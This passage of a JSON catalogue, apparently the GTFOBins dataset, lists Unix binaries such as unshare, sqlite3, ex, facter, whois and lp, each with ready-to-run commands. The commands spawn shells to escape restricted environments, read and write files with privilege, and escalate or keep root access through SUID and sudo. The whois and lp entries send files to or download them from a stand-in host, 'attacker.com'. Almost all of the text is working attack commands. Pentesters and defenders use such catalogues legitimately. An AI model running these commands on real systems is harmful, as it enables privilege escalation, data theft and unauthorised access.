          "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "unshare": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "unshare /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./unshare -r /bin/sh",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo unshare /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cut": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "hexdump": {
    "description": "The output is actually an hex dump.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nhexdump -C \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "diff": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "LFOLDER=folder_to_list\nTF=$(mktemp -d)\ndiff --recursive $TF $LFOLDER\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "whois": {
    "description": "`whois` hangs waiting for the remote peer to close the socket.\n",
    "functions": {
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`cat $LFILE`\"\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`base64 $LFILE`\"\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n",
          "description": "It can download remote files."
        },
        {
          "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\"\n",
          "description": "It can download remote files."
        }
      ]
    }
  },
  "facter": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "uuencode": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "base64": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "unexpand": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "grep": {
    "description": "There are many `grep` flavors that in many cases are just copies, symlinks or wrappers around the original binary that may share the same behavior, for example: `egrep`, `fgrep`, `zgrep`, etc.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\ngrep '' $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./grep '' $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo grep '' $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "lp": {
    "description": "",
    "functions": {
      "file-upload": [
        {
          "code": "LFILE=file_to_send\nRHOST=attacker.com\nlp $LFILE -h $RHOST\n",
          "description": "It can exfiltrate files on the network."
        }
      ]
    }
  },
  "sqlite3": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "sqlite3 /dev/null '.shell /bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo sqlite3 /dev/null '.shell /bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./sqlite3 /dev/null '.shell /bin/sh'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "ex": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ex\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "ex file_to_write\na\nDATA\n.\nw\nq\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "ex file_to_read\n,p\nq\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo ex\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "bc": {
    "description": "The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nbc -s $LFILE\nquit\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./bc -s $LFILE\nquit\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "bridge": {
    "description": "Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nbridge -b \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  }
}